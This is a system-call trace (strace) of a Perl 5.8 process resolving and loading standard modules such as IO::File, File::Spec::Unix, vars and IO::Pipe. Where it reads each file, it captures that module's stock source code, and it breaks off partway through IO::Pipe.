5498  07:09:19.814581 stat64("/etc/perl/IO/File.pm", 0xbf9c262c) = -1 ENOENT (No such file or directory)
5498  07:09:19.814594 stat64("/usr/local/lib/perl/5.8.8/IO/File.pmc", 0xbf9c271c) = -1 ENOENT (No such file or directory)
5498  07:09:19.814607 stat64("/usr/local/lib/perl/5.8.8/IO/File.pm", 0xbf9c262c) = -1 ENOENT (No such file or directory)
5498  07:09:19.814621 stat64("/usr/local/share/perl/5.8.8/IO/File.pmc", 0xbf9c271c) = -1 ENOENT (No such file or directory)
5498  07:09:19.814634 stat64("/usr/local/share/perl/5.8.8/IO/File.pm", 0xbf9c262c) = -1 ENOENT (No such file or directory)
5498  07:09:19.814658 stat64("/usr/lib/perl5/IO/File.pmc", 0xbf9c271c) = -1 ENOENT (No such file or directory)
5498  07:09:19.814694 stat64("/usr/lib/perl5/IO/File.pm", 0xbf9c262c) = -1 ENOENT (No such file or directory)
5498  07:09:19.814708 stat64("/usr/share/perl5/IO/File.pmc", 0xbf9c271c) = -1 ENOENT (No such file or directory)
5498  07:09:19.814737 stat64("/usr/share/perl5/IO/File.pm", 0xbf9c262c) = -1 ENOENT (No such file or directory)
5498  07:09:19.814750 stat64("/usr/lib/perl/5.8/IO/File.pmc", 0xbf9c271c) = -1 ENOENT (No such file or directory)
5498  07:09:19.814763 stat64("/usr/lib/perl/5.8/IO/File.pm", {st_mode=S_IFREG|0644, st_size=1784, ...}) = 0
5498  07:09:19.814784 open("/usr/lib/perl/5.8/IO/File.pm", O_RDONLY|O_LARGEFILE) = 10
5498  07:09:19.814798 ioctl(10, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9c2438) = -1 ENOTTY (Inappropriate ioctl for device)
5498  07:09:19.814809 _llseek(10, 0, [0], SEEK_CUR) = 0
5498  07:09:19.814827 read(10, "#\n\npackage IO::File;\n\nuse 5.006_001;\nuse strict;\nour($VERSION, @EXPORT, @EXPORT_OK, @ISA);\nuse Carp;\nuse Symbol;\nuse SelectSaver;\nuse IO::Seekable;\nuse File::Spec;\n\nrequire Exporter;\n\n@ISA = qw(IO::Handle IO::Seekable Exporter);\n\n$VERSION = \"1.13\";\n\n@EXPORT = @IO::Seekable::EXPORT;\n\neval {\n    # Make all Fcntl O_XXX constants available for importing\n    require Fcntl;\n    my @O = grep /^O_/, @Fcntl::EXPORT;\n    Fcntl->import(@O);  # first we import what we want to export\n    push(@EXPORT, @O);\n};\n\n################################################\n## Constructor\n##\n\nsub new {\n    my $type = shift;\n    my $class = ref($type) || $type || \"IO::File\";\n    @_ >= 0 && @_ <= 3\n\tor croak \"usage: new $class [FILENAME [,MODE [,PERMS]]]\";\n    my $fh = $class->SUPER::new();\n    if (@_) {\n\t$fh->open(@_)\n\t    or return undef;\n    }\n    $fh;\n}\n\n################################################\n## Open\n##\n\nsub open {\n    @_ >= 2 && @_ <= 4 or croak \'usage: $fh->open(FILENAME [,MODE [,PERMS]])\';\n    my ($fh, $file) = @_;\n    if (@_ > 2) {\n\tmy ($mode, $perms) = @_[2, 3];\n\tif ($mode =~ /^\\d+$/) {\n\t    defined $perms or $perms = 0666;\n\t    return sysopen($fh, $file, $mode, $perms);\n\t} elsif ($mode =~ /:/) {\n\t    return open($fh, $mode, $file) if @_ == 3;\n\t    croak \'usage: $fh->open(FILENAME, IOLAYERS)\';\n\t}\n\tif (defined($file) && length($file)\n\t    && ! File::Spec->file_name_is_absolute($file))\n\t{\n\t    $file = File::Spec->rel2abs($file);\n\t}\n\t$file = IO::Handle::_open_mode_string($mode) . \" $file\\0\";\n    }\n    open($fh, $file);\n}\n\n################################################\n## Binmode\n##\n\nsub binmode {\n    ( @_ == 1 or @_ == 2 ) or croak \'usage $fh->binmode([LAYER])\';\n\n    my($fh, $layer) = @_;\n\n    return binmode $$fh unless $layer;\n    return binmode $$fh, $layer;\n}\n\n1;\n", 4096) = 1784
5498  07:09:19.815065 stat64("/etc/perl/File/Spec.pmc", 0xbf9c226c) = -1 ENOENT (No such file or directory)
5498  07:09:19.815081 stat64("/etc/perl/File/Spec.pm", 0xbf9c217c) = -1 ENOENT (No such file or directory)
5498  07:09:19.815094 stat64("/usr/local/lib/perl/5.8.8/File/Spec.pmc", 0xbf9c226c) = -1 ENOENT (No such file or directory)
5498  07:09:19.815107 stat64("/usr/local/lib/perl/5.8.8/File/Spec.pm", 0xbf9c217c) = -1 ENOENT (No such file or directory)
5498  07:09:19.815121 stat64("/usr/local/share/perl/5.8.8/File/Spec.pmc", 0xbf9c226c) = -1 ENOENT (No such file or directory)
5498  07:09:19.815134 stat64("/usr/local/share/perl/5.8.8/File/Spec.pm", 0xbf9c217c) = -1 ENOENT (No such file or directory)
5498  07:09:19.815232 stat64("/usr/lib/perl5/File/Spec.pmc", 0xbf9c226c) = -1 ENOENT (No such file or directory)
5498  07:09:19.815271 stat64("/usr/lib/perl5/File/Spec.pm", 0xbf9c217c) = -1 ENOENT (No such file or directory)
5498  07:09:19.815285 stat64("/usr/share/perl5/File/Spec.pmc", 0xbf9c226c) = -1 ENOENT (No such file or directory)
5498  07:09:19.815314 stat64("/usr/share/perl5/File/Spec.pm", 0xbf9c217c) = -1 ENOENT (No such file or directory)
5498  07:09:19.815327 stat64("/usr/lib/perl/5.8/File/Spec.pmc", 0xbf9c226c) = -1 ENOENT (No such file or directory)
5498  07:09:19.815340 stat64("/usr/lib/perl/5.8/File/Spec.pm", 0xbf9c217c) = -1 ENOENT (No such file or directory)
5498  07:09:19.815353 stat64("/usr/share/perl/5.8/File/Spec.pmc", 0xbf9c226c) = -1 ENOENT (No such file or directory)
5498  07:09:19.815366 stat64("/usr/share/perl/5.8/File/Spec.pm", {st_mode=S_IFREG|0644, st_size=595, ...}) = 0
5498  07:09:19.815386 open("/usr/share/perl/5.8/File/Spec.pm", O_RDONLY|O_LARGEFILE) = 11
5498  07:09:19.815401 ioctl(11, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9c1f88) = -1 ENOTTY (Inappropriate ioctl for device)
5498  07:09:19.815412 _llseek(11, 0, [0], SEEK_CUR) = 0
5498  07:09:19.815430 read(11, "package File::Spec;\n\nuse strict;\nuse vars qw(@ISA $VERSION);\n\n$VERSION = \'3.12\';\n$VERSION = eval $VERSION;\n\nmy %module = (MacOS   => \'Mac\',\n\t      MSWin32 => \'Win32\',\n\t      os2     => \'OS2\',\n\t      VMS     => \'VMS\',\n\t      epoc    => \'Epoc\',\n\t      NetWare => \'Win32\', # Yes, File::Spec::Win32 works on NetWare.\n\t      symbian => \'Win32\', # Yes, File::Spec::Win32 works on symbian.\n\t      dos     => \'OS2\',   # Yes, File::Spec::OS2 works on DJGPP.\n\t      cygwin  => \'Cygwin\');\n\nmy $module = $module{$^O} || \'Unix\';\n\nrequire \"File/Spec/$module.pm\";\n@ISA = (\"File::Spec::$module\");\n\n1;\n\n__END__\n\n", 4096) = 595
5498  07:09:19.815504 stat64("/etc/perl/vars.pmc", 0xbf9c1dbc) = -1 ENOENT (No such file or directory)
5498  07:09:19.815518 stat64("/etc/perl/vars.pm", 0xbf9c1ccc) = -1 ENOENT (No such file or directory)
5498  07:09:19.815531 stat64("/usr/local/lib/perl/5.8.8/vars.pmc", 0xbf9c1dbc) = -1 ENOENT (No such file or directory)
5498  07:09:19.815543 stat64("/usr/local/lib/perl/5.8.8/vars.pm", 0xbf9c1ccc) = -1 ENOENT (No such file or directory)
5498  07:09:19.815557 stat64("/usr/local/share/perl/5.8.8/vars.pmc", 0xbf9c1dbc) = -1 ENOENT (No such file or directory)
5498  07:09:19.815569 stat64("/usr/local/share/perl/5.8.8/vars.pm", 0xbf9c1ccc) = -1 ENOENT (No such file or directory)
5498  07:09:19.815584 stat64("/usr/lib/perl5/vars.pmc", 0xbf9c1dbc) = -1 ENOENT (No such file or directory)
5498  07:09:19.815595 stat64("/usr/lib/perl5/vars.pm", 0xbf9c1ccc) = -1 ENOENT (No such file or directory)
5498  07:09:19.815608 stat64("/usr/share/perl5/vars.pmc", 0xbf9c1dbc) = -1 ENOENT (No such file or directory)
5498  07:09:19.815620 stat64("/usr/share/perl5/vars.pm", 0xbf9c1ccc) = -1 ENOENT (No such file or directory)
5498  07:09:19.815632 stat64("/usr/lib/perl/5.8/vars.pmc", 0xbf9c1dbc) = -1 ENOENT (No such file or directory)
5498  07:09:19.815644 stat64("/usr/lib/perl/5.8/vars.pm", 0xbf9c1ccc) = -1 ENOENT (No such file or directory)
5498  07:09:19.815657 stat64("/usr/share/perl/5.8/vars.pmc", 0xbf9c1dbc) = -1 ENOENT (No such file or directory)
5498  07:09:19.815673 stat64("/usr/share/perl/5.8/vars.pm", {st_mode=S_IFREG|0644, st_size=1149, ...}) = 0
5498  07:09:19.815694 open("/usr/share/perl/5.8/vars.pm", O_RDONLY|O_LARGEFILE) = 12
5498  07:09:19.815707 ioctl(12, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9c1ad8) = -1 ENOTTY (Inappropriate ioctl for device)
5498  07:09:19.815727 _llseek(12, 0, [0], SEEK_CUR) = 0
5498  07:09:19.815774 read(12, "package vars;\n\nuse 5.006;\n\nour $VERSION = \'1.01\';\n\nuse warnings::register;\nuse strict qw(vars subs);\n\nsub import {\n    my $callpack = caller;\n    my ($pack, @imports) = @_;\n    my ($sym, $ch);\n    foreach (@imports) {\n        if (($ch, $sym) = /^([\\$\\@\\%\\*\\&])(.+)/) {\n\t    if ($sym =~ /\\W/) {\n\t\t# time for a more-detailed check-up\n\t\tif ($sym =~ /^\\w+[[{].*[]}]$/) {\n\t\t    require Carp;\n\t\t    Carp::croak(\"Can\'t declare individual elements of hash or array\");\n\t\t} elsif (warnings::enabled() and length($sym) == 1 and $sym !~ tr/a-zA-Z//) {\n\t\t    warnings::warn(\"No need to declare built-in vars\");\n\t\t} elsif  (($^H &= strict::bits(\'vars\'))) {\n\t\t    require Carp;\n\t\t    Carp::croak(\"\'$_\' is not a valid variable name under strict vars\");\n\t\t}\n\t    }\n\t    $sym = \"${callpack}::$sym\" unless $sym =~ /::/;\n\t    *$sym =\n\t\t(  $ch eq \"\\$\" ? \\$$sym\n\t\t : $ch eq \"\\@\" ? \\@$sym\n\t\t : $ch eq \"\\%\" ? \\%$sym\n\t\t : $ch eq \"\\*\" ? \\*$sym\n\t\t : $ch eq \"\\&\" ? \\&$sym \n\t\t : do {\n\t\t     require Carp;\n\t\t     Carp::croak(\"\'$_\' is not a valid variable name\");\n\t\t });\n\t} else {\n\t    require Carp;\n\t    Carp::croak(\"\'$_\' is not a valid variable name\");\n\t}\n    }\n};\n\n1;\n__END__\n\n", 4096) = 1149
5498  07:09:19.815922 stat64("/etc/perl/warnings/register.pmc", 0xbf9c190c) = -1 ENOENT (No such file or directory)
5498  07:09:19.815936 stat64("/etc/perl/warnings/register.pm", 0xbf9c181c) = -1 ENOENT (No such file or directory)
5498  07:09:19.815969 stat64("/usr/local/lib/perl/5.8.8/warnings/register.pmc", 0xbf9c190c) = -1 ENOENT (No such file or directory)
5498  07:09:19.815999 stat64("/usr/local/lib/perl/5.8.8/warnings/register.pm", 0xbf9c181c) = -1 ENOENT (No such file or directory)
5498  07:09:19.816013 stat64("/usr/local/share/perl/5.8.8/warnings/register.pmc", 0xbf9c190c) = -1 ENOENT (No such file or directory)
5498  07:09:19.816026 stat64("/usr/local/share/perl/5.8.8/warnings/register.pm", 0xbf9c181c) = -1 ENOENT (No such file or directory)
5498  07:09:19.816040 stat64("/usr/lib/perl5/warnings/register.pmc", 0xbf9c190c) = -1 ENOENT (No such file or directory)
5498  07:09:19.816053 stat64("/usr/lib/perl5/warnings/register.pm", 0xbf9c181c) = -1 ENOENT (No such file or directory)
5498  07:09:19.816066 stat64("/usr/share/perl5/warnings/register.pmc", 0xbf9c190c) = -1 ENOENT (No such file or directory)
5498  07:09:19.816078 stat64("/usr/share/perl5/warnings/register.pm", 0xbf9c181c) = -1 ENOENT (No such file or directory)
5498  07:09:19.816092 stat64("/usr/lib/perl/5.8/warnings/register.pmc", 0xbf9c190c) = -1 ENOENT (No such file or directory)
5498  07:09:19.816105 stat64("/usr/lib/perl/5.8/warnings/register.pm", 0xbf9c181c) = -1 ENOENT (No such file or directory)
5498  07:09:19.816119 stat64("/usr/share/perl/5.8/warnings/register.pmc", 0xbf9c190c) = -1 ENOENT (No such file or directory)
5498  07:09:19.816132 stat64("/usr/share/perl/5.8/warnings/register.pm", {st_mode=S_IFREG|0644, st_size=732, ...}) = 0
5498  07:09:19.816153 open("/usr/share/perl/5.8/warnings/register.pm", O_RDONLY|O_LARGEFILE) = 13
5498  07:09:19.816168 ioctl(13, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9c1628) = -1 ENOTTY (Inappropriate ioctl for device)
5498  07:09:19.816178 _llseek(13, 0, [0], SEEK_CUR) = 0
5498  07:09:19.816196 read(13, "package warnings::register;\n\nour $VERSION = \'1.01\';\n\nrequire warnings;\n\nsub mkMask\n{\n    my ($bit) = @_;\n    my $mask = \"\";\n\n    vec($mask, $bit, 1) = 1;\n    return $mask;\n}\n\nsub import\n{\n    shift;\n    my $package = (caller(0))[0];\n    if (! defined $warnings::Bits{$package}) {\n        $warnings::Bits{$package}     = mkMask($warnings::LAST_BIT);\n        vec($warnings::Bits{\'all\'}, $warnings::LAST_BIT, 1) = 1;\n        $warnings::Offsets{$package}  = $warnings::LAST_BIT ++;\n\tforeach my $k (keys %warnings::Bits) {\n\t    vec($warnings::Bits{$k}, $warnings::LAST_BIT, 1) = 0;\n\t}\n        $warnings::DeadBits{$package} = mkMask($warnings::LAST_BIT);\n        vec($warnings::DeadBits{\'all\'}, $warnings::LAST_BIT++, 1) = 1;\n    }\n}\n\n1;\n", 4096) = 732
5498  07:09:19.816436 read(13, "", 4096) = 0
5498  07:09:19.816450 close(13)         = 0
5498  07:09:19.816640 _llseek(12, 1148, [1148], SEEK_SET) = 0
5498  07:09:19.816656 _llseek(12, 0, [1148], SEEK_CUR) = 0
5498  07:09:19.816666 close(12)         = 0
5498  07:09:19.816807 _llseek(11, 594, [594], SEEK_SET) = 0
5498  07:09:19.816823 _llseek(11, 0, [594], SEEK_CUR) = 0
5498  07:09:19.816833 close(11)         = 0
5498  07:09:19.816867 stat64("/etc/perl/File/Spec/Unix.pmc", 0xbf9c226c) = -1 ENOENT (No such file or directory)
5498  07:09:19.816882 stat64("/etc/perl/File/Spec/Unix.pm", 0xbf9c217c) = -1 ENOENT (No such file or directory)
5498  07:09:19.816896 stat64("/usr/local/lib/perl/5.8.8/File/Spec/Unix.pmc", 0xbf9c226c) = -1 ENOENT (No such file or directory)
5498  07:09:19.816909 stat64("/usr/local/lib/perl/5.8.8/File/Spec/Unix.pm", 0xbf9c217c) = -1 ENOENT (No such file or directory)
5498  07:09:19.816924 stat64("/usr/local/share/perl/5.8.8/File/Spec/Unix.pmc", 0xbf9c226c) = -1 ENOENT (No such file or directory)
5498  07:09:19.816937 stat64("/usr/local/share/perl/5.8.8/File/Spec/Unix.pm", 0xbf9c217c) = -1 ENOENT (No such file or directory)
5498  07:09:19.816951 stat64("/usr/lib/perl5/File/Spec/Unix.pmc", 0xbf9c226c) = -1 ENOENT (No such file or directory)
5498  07:09:19.816963 stat64("/usr/lib/perl5/File/Spec/Unix.pm", 0xbf9c217c) = -1 ENOENT (No such file or directory)
5498  07:09:19.816977 stat64("/usr/share/perl5/File/Spec/Unix.pmc", 0xbf9c226c) = -1 ENOENT (No such file or directory)
5498  07:09:19.816989 stat64("/usr/share/perl5/File/Spec/Unix.pm", 0xbf9c217c) = -1 ENOENT (No such file or directory)
5498  07:09:19.817002 stat64("/usr/lib/perl/5.8/File/Spec/Unix.pmc", 0xbf9c226c) = -1 ENOENT (No such file or directory)
5498  07:09:19.817015 stat64("/usr/lib/perl/5.8/File/Spec/Unix.pm", 0xbf9c217c) = -1 ENOENT (No such file or directory)
5498  07:09:19.817029 stat64("/usr/share/perl/5.8/File/Spec/Unix.pmc", 0xbf9c226c) = -1 ENOENT (No such file or directory)
5498  07:09:19.817043 stat64("/usr/share/perl/5.8/File/Spec/Unix.pm", {st_mode=S_IFREG|0644, st_size=7038, ...}) = 0
5498  07:09:19.817064 open("/usr/share/perl/5.8/File/Spec/Unix.pm", O_RDONLY|O_LARGEFILE) = 11
5498  07:09:19.817080 ioctl(11, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9c1f88) = -1 ENOTTY (Inappropriate ioctl for device)
5498  07:09:19.817091 _llseek(11, 0, [0], SEEK_CUR) = 0
5498  07:09:19.817108 read(11, "package File::Spec::Unix;\n\nuse strict;\nuse vars qw($VERSION);\n\n$VERSION = \'1.5\';\n\nsub canonpath {\n    my ($self,$path) = @_;\n    \n    # Handle POSIX-style node names beginning with double slash (qnx, nto)\n    # Handle network path names beginning with double slash (cygwin)\n    # (POSIX says: \"a pathname that begins with two successive slashes\n    # may be interpreted in an implementation-defined manner, although\n    # more than two leading slashes shall be treated as a single slash.\")\n    my $node = \'\';\n    if ( $^O =~ m/^(?:qnx|nto|cygwin)$/ && $path =~ s:^(//[^/]+)(/|\\z):/:s ) {\n      $node = $1;\n    }\n    # This used to be\n    # $path =~ s|/+|/|g unless($^O eq \'cygwin\');\n    # but that made tests 29, 30, 35, 46, and 213 (as of #13272) to fail\n    # (Mainly because trailing \"\" directories didn\'t get stripped).\n    # Why would cygwin avoid collapsing multiple slashes into one? --jhi\n    $path =~ s|/+|/|g;                             # xx////xx  -> xx/xx\n    $path =~ s@(/\\.)+(/|\\Z(?!\\n))@/@g;             # xx/././xx -> xx/xx\n    $path =~ s|^(\\./)+||s unless $path eq \"./\";    # ./xx      -> xx\n    $path =~ s|^/(\\.\\./)+|/|;                      # /../../xx -> xx\n    $path =~ s|^/\\.\\.$|/|;                         # /..       -> /\n    $path =~ s|/\\Z(?!\\n)|| unless $path eq \"/\";          # xx/       -> xx\n    return \"$node$path\";\n}\n\nsub catdir {\n    my $self = shift;\n\n    $self->canonpath(join(\'/\', @_, \'\')); # \'\' because need a trailing \'/\'\n}\n\nsub catfile {\n    my $self = shift;\n    my $file = $self->canonpath(pop @_);\n    return $file unless @_;\n    my $dir = $self->catdir(@_);\n    $dir .= \"/\" unless substr($dir,-1) eq \"/\";\n    return $dir.$file;\n}\n\nsub curdir () { \'.\' }\n\nsub devnull () { \'/dev/null\' }\n\nsub rootdir () { \'/\' }\n\nmy $tmpdir;\nsub _tmpdir {\n    return $tmpdir if defined $tmpdir;\n    my $self = shift;\n    my @dirlist = @_;\n    {\n\tno strict \'refs\';\n\tif (${\"\\cTAINT\"}) { # Check for taint mode on perl >= 5.8.0\n            require Scalar::Util;\n\t    @dirlist = grep { ! Scalar::Util::tainted($_) } @dirlist;\n\t}\n    }\n    foreach (@dirlist) {\n\tnext unless defined && -d && -w _;\n\t$tmpdir = $_;\n\tlast;\n    }\n    $tmpdir = $self->curdir unless defined $tmpdir;\n    $tmpdir = defined $tmpdir && $self->canonpath($tmpdir);\n    return $tmpdir;\n}\n\nsub tmpdir {\n    return $tmpdir if defined $tmpdir;\n    $tmpdir = $_[0]->_tmpdir( $ENV{TMPDIR}, \"/tmp\" );\n}\n\nsub updir () { \'..\' }\n\nsub no_upwards {\n    my $self = shift;\n    return grep(!/^\\.{1,2}\\Z(?!\\n)/s, @_);\n}\n\nsub case_tolerant () { 0 }\n\nsub file_name_is_absolute {\n    my ($self,$file) = @_;\n    return scalar($file =~ m:^/:s);\n}\n\nsub path {\n    return () unless exists $ENV{PATH};\n    my @path = split(\':\', $ENV{PATH});\n    foreach (@path) { $_ = \'.\' if $_ eq \'\' }\n    return @path;\n}\n\nsub join {\n    my $self = shift;\n    return $self->catfile(@_);\n}\n\nsub splitpath {\n    my ($self,$path, $nofile) = @_;\n\n    my ($volume,$directory,$file) = (\'\',\'\',\'\');\n\n    if ( $nofile ) {\n        $directory = $path;\n    }\n    else {\n        $path =~ m|^ ( (?: .* / (?: \\.\\.?\\Z(?!\\n) )? )? ) ([^/]*) |xs;\n        $directory = $1;\n        $file      = $2;\n    }\n\n    return ($volume,$directory,$file);\n}\n\nsub splitdir {\n    return split m|/|, $_[1], -1;  # Preserve trailing fields\n}\n\nsub catpath {\n    my ($self,$volume,$directory,$file) = @_;\n\n    if ( $directory ne \'\'                && \n         $file ne \'\'                     && \n         substr( $directory, -1 ) ne \'/\' && \n         substr( $file, 0, 1 ) ne \'/\' \n    ) {\n        $directory .= \"/$file\" ;\n    }\n    else {\n        $directory .= $file ;\n    }\n\n    return $directory ;\n}\n\nsub abs2rel {\n    my($self,$path,$base) = @_;\n\n    # Figure out the effective $base and clean it up.\n    if ( !defined( $base ) || $base eq \'\' ) {\n        $base = $self->_cwd();\n    }\n    elsif ( ! $self->file_name_is_absolute( $base ) ) {\n\tif ( ! $self->file_name_is_absolute( $path ) ) {\n\t    # optimisation where both paths are relative: save 2 x cwd\n\t    $base = $self->canonpath( \"/$base\" );\n\t    $path = \"/$path\";\n\t}\n\telse {\n\t    $base = $self->rel2abs( $base ) ;\n\t}\n    }\n  ", 4096) = 4096
5498  07:09:19.817721 brk(0x8218000)    = 0x8218000
5498  07:09:19.817864 read(11, "  else {\n        $base = $self->canonpath( $base ) ;\n    }\n\n    # Clean up $path\n    if ( ! $self->file_name_is_absolute( $path ) ) {\n        $path = $self->rel2abs( $path ) ;\n    }\n    else {\n        $path = $self->canonpath( $path ) ;\n    }\n\n    # Now, remove all leading components that are the same\n    my @pathchunks = $self->splitdir( $path);\n    my @basechunks = $self->splitdir( $base);\n\n    while (@pathchunks && @basechunks && $pathchunks[0] eq $basechunks[0]) {\n        shift @pathchunks ;\n        shift @basechunks ;\n    }\n\n    $path = CORE::join( \'/\', @pathchunks );\n    $base = CORE::join( \'/\', @basechunks );\n\n    # $base now contains the directories the resulting relative path \n    # must ascend out of before it can descend to $path_directory.  So, \n    # replace all names with $parentDir\n    $base =~ s|[^/]+|..|g ;\n\n    # Glue the two together, using a separator if necessary, and preventing an\n    # empty result.\n    if ( $path ne \'\' && $base ne \'\' ) {\n        $path = \"$base/$path\" ;\n    } else {\n        $path = \"$base$path\" ;\n    }\n\n    return $self->canonpath( $path ) ;\n}\n\nsub rel2abs {\n    my ($self,$path,$base ) = @_;\n\n    # Clean up $path\n    if ( ! $self->file_name_is_absolute( $path ) ) {\n        # Figure out the effective $base and clean it up.\n        if ( !defined( $base ) || $base eq \'\' ) {\n\t    $base = $self->_cwd();\n        }\n        elsif ( ! $self->file_name_is_absolute( $base ) ) {\n            $base = $self->rel2abs( $base ) ;\n        }\n        else {\n            $base = $self->canonpath( $base ) ;\n        }\n\n        # Glom them together\n        $path = $self->catdir( $base, $path ) ;\n    }\n\n    return $self->canonpath( $path ) ;\n}\n\n# Internal routine to File::Spec, no point in making this public since\n# it is the standard Cwd interface.  Most of the platform-specific\n# File::Spec subclasses use this.\nsub _cwd {\n    require Cwd;\n    Cwd::cwd();\n}\n\n# Internal method to reduce xx\\..\\yy -> yy\nsub _collapse {\n    my($fs, $path) = @_;\n\n    my $updir  = $fs->updir;\n    my $curdir = $fs->curdir;\n\n    my($vol, $dirs, $file) = $fs->splitpath($path);\n    my @dirs = $fs->splitdir($dirs);\n\n    my @collapsed;\n    foreach my $dir (@dirs) {\n        if( $dir eq $updir              and   # if we have an updir\n            @collapsed                  and   # and something to collapse\n            length $collapsed[-1]       and   # and its not the rootdir\n            $collapsed[-1] ne $updir    and   # nor another updir\n            $collapsed[-1] ne $curdir         # nor the curdir\n          ) \n        {                                     # then\n            pop @collapsed;                   # collapse\n        }\n        else {                                # else\n            push @collapsed, $dir;            # just hang onto it\n        }\n    }\n\n    return $fs->catpath($vol,\n                        $fs->catdir(@collapsed),\n                        $file\n                       );\n}\n\n1;\n", 4096) = 2942
5498  07:09:19.818287 read(11, "", 4096) = 0
5498  07:09:19.818302 close(11)         = 0
5498  07:09:19.818487 read(10, "", 4096) = 0
5498  07:09:19.818502 close(10)         = 0
5498  07:09:19.818718 stat64("/etc/perl/IO/Pipe.pmc", 0xbf9c271c) = -1 ENOENT (No such file or directory)
5498  07:09:19.818735 stat64("/etc/perl/IO/Pipe.pm", 0xbf9c262c) = -1 ENOENT (No such file or directory)
5498  07:09:19.818749 stat64("/usr/local/lib/perl/5.8.8/IO/Pipe.pmc", 0xbf9c271c) = -1 ENOENT (No such file or directory)
5498  07:09:19.818762 stat64("/usr/local/lib/perl/5.8.8/IO/Pipe.pm", 0xbf9c262c) = -1 ENOENT (No such file or directory)
5498  07:09:19.818776 stat64("/usr/local/share/perl/5.8.8/IO/Pipe.pmc", 0xbf9c271c) = -1 ENOENT (No such file or directory)
5498  07:09:19.818788 stat64("/usr/local/share/perl/5.8.8/IO/Pipe.pm", 0xbf9c262c) = -1 ENOENT (No such file or directory)
5498  07:09:19.818802 stat64("/usr/lib/perl5/IO/Pipe.pmc", 0xbf9c271c) = -1 ENOENT (No such file or directory)
5498  07:09:19.818814 stat64("/usr/lib/perl5/IO/Pipe.pm", 0xbf9c262c) = -1 ENOENT (No such file or directory)
5498  07:09:19.818827 stat64("/usr/share/perl5/IO/Pipe.pmc", 0xbf9c271c) = -1 ENOENT (No such file or directory)
5498  07:09:19.818838 stat64("/usr/share/perl5/IO/Pipe.pm", 0xbf9c262c) = -1 ENOENT (No such file or directory)
5498  07:09:19.818851 stat64("/usr/lib/perl/5.8/IO/Pipe.pmc", 0xbf9c271c) = -1 ENOENT (No such file or directory)
5498  07:09:19.818864 stat64("/usr/lib/perl/5.8/IO/Pipe.pm", {st_mode=S_IFREG|0644, st_size=3426, ...}) = 0
5498  07:09:19.818885 open("/usr/lib/perl/5.8/IO/Pipe.pm", O_RDONLY|O_LARGEFILE) = 10
5498  07:09:19.818900 ioctl(10, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9c2438) = -1 ENOTTY (Inappropriate ioctl for device)
5498  07:09:19.818911 _llseek(10, 0, [0], SEEK_CUR) = 0
5498  07:09:19.818932 read(10, "# IO::Pipe.pm\n#\n# Copyright (c) 1996-8 Graham Barr <gbarr@pobox.com>. All rights reserved.\n# This program is free software; you can redistribute it and/or\n# modify it under the same terms as Perl itself.\n\npackage IO::Pipe;\n\nuse 5.006_001;\n\nuse IO::Handle;\nuse strict;\nour($VERSION);\nuse Carp;\nuse Symbol;\n\n$VERSION = \"1.13\";\n\nsub new {\n    my $type = shift;\n    my $class = ref($type) || $type || \"IO::Pipe\";\n    @_ == 0 || @_ == 2 or croak \"usage: new $class [READFH, WRITEFH]\";\n\n    my $me = bless gensym(), $class;\n\n    my($readfh,$writefh) = @_ ? @_ : $me->handles;\n\n    pipe($readfh, $writefh)\n\tor return undef;\n\n    @{*$me} = ($readfh, $writefh);\n\n    $me;\n}\n\nsub handles {\n    @_ == 1 or croak \'usage: $pipe->handles()\';\n    (IO::Pipe::End->new(), IO::Pipe::End->new());\n}\n\nmy $do_spawn = $^O eq \'os2\' || $^O eq \'MSWin32\';\n\nsub _doit {\n    my $me = shift;\n    my $rw = shift;\n\n    my $pid = $do_spawn ? 0 : fork();\n\n    if($pid) { # Parent\n        return $pid;\n    }\n    elsif(defined $pid) { # Child or spawn\n        my $fh;\n        my $io = $rw ? \\*STDIN : \\*STDOUT;\n        my ($mode, $save) = $rw ? \"r\" : \"w\";\n        if ($do_spawn) {\n          require Fcntl;\n          $save = IO::Handle->new_from_fd($io, $mode);\n\t  my $handle = shift;\n          # Close in child:\n\t  unless ($^O eq \'MSWin32\') {\n            fcntl($handle, Fcntl::F_SETFD(), 1) or croak \"fcntl: $!\";\n\t  }\n          $fh = $rw ? ${*$me}[0] : ${*$me}[1];\n        } else {\n          shift;\n          $fh = $rw ? $me->reader() : $me->writer(); # close the other end\n        }\n        bless $io, \"IO::Handle\";\n        $io->fdopen($fh, $mode);\n\t$fh->close;\n\n        if ($do_spawn) {\n          $pid = eval { system 1, @_ }; # 1 == P_NOWAIT\n          my $err = $!;\n    \n          $io->fdopen($save, $mode);\n          $save->close or croak \"Cannot close $!\";\n          croak \"IO::Pipe: Cannot spawn-NOWAIT: $err\" if not $pid or $pid < 0;\n          return $pid;\n        } else {\n          exec @_ or\n            croak \"IO::Pipe: Cannot exec: $!\";\n        }\n    }\n    else {\n        croak \"IO::Pipe: Cannot fork: $!\";\n    }\n\n    # NOT Reached\n}\n\nsub reader {\n    @_ >= 1 or croak \'usage: $pipe->reader( [SUB_COMMAND_ARGS] )\';\n    my $me = shift;\n\n    return undef\n\tunless(ref($me) || ref($me = $me->new));\n\n    my $fh  = ${*$me}[0];\n    my $pid;\n    $pid = $me->_doit(0, $fh, @_)\n        if(@_);\n\n    close ${*$me}[1];\n    bless $me, ref($fh);\n    *$me = *$fh;          # Alias self to handle\n    $me->fdopen($fh->fileno,\"r\")\n\tunless defined($me->fileno);\n    bless $fh;                  # Really wan\'t un-bless here\n    ${*$me}{\'io_pipe_pid\'} = $pid\n        if defined $pid;\n\n    $me;\n}\n\nsub writer {\n    @_ >= 1 or croak \'usage: $pipe->writer( [SUB_COMMAND_ARGS] )\';\n    my $me = shift;\n\n    return undef\n\tunless(ref($me) || ref($me = $me->new));\n\n    my $fh  = ${*$me}[1];\n    my $pid;\n    $pid = $me->_doit(1, $fh, @_)\n        if(@_);\n\n    close ${*$me}[0];\n    bless $me, ref($fh);\n    *$me = *$fh;          # Alias self to handle\n    $me->fdopen($fh->fileno,\"w\")\n\tunless defined($me->fileno);\n    bless $fh;                  # Really wan\'t un-bless here\n    ${*$me}{\'io_pipe_pid\'} = $pid\n        if defined $pid;\n\n    $me;\n}\n\npackage IO::Pipe::End;\n\nour(@ISA);\n\n@ISA = qw(IO::Handle);\n\nsub close {\n    my $fh = shift;\n    my $r = $fh->SUPER::close(@_);\n\n    